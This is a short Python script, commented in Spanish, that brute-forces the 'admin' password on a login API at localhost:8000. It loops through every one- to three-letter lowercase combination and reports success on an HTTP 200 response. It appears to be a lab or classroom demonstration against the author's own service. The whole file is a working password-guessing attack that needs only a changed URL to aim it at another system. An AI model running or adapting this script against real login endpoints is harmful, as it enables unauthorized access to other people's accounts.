import requests
import itertools
import string
import time

# 1. A quien vamos atacar
url = "http://127.0.0.1:8000/login"
usuario_objetivo = "admin"

# 2. Las letras que vamos a combinar 
letras = string.ascii_lowercase 

print("Iniciando ataque de fuerza bruta contra la API local...")
print("Generando combinaciones...")
time.sleep(2) # Pausa de 2 segundos para meterle dramatismo

# 3. Empezamos el bucle: probar combinaciones de 1 a 3 letras
for longitud in range(1, 4):
    # itertools genera todaslas combinaciones posibles
    for combinacion in itertools.product(letras, repeat=longitud):
        intento_password = "".join(combinacion)
        
        # 4. Le enviamos la petición a la API
        datos = {"username": usuario_objetivo, "password": intento_password}
        respuesta = requests.post(url, json=datos)
        
        # 5. Si la API nos devuelve un código 200, se adivino la clave
        if respuesta.status_code == 200:
            print(f"\n¡CHEVERE! Contraseña encontrada: '{intento_password}'")
            print("Buarlamos la seguridad.")
            exit()
        else:
            # Imprimimos el intento fallido en la misma línea para que se vea rápido
            print(f"Probando: {intento_password}    ", end="\r")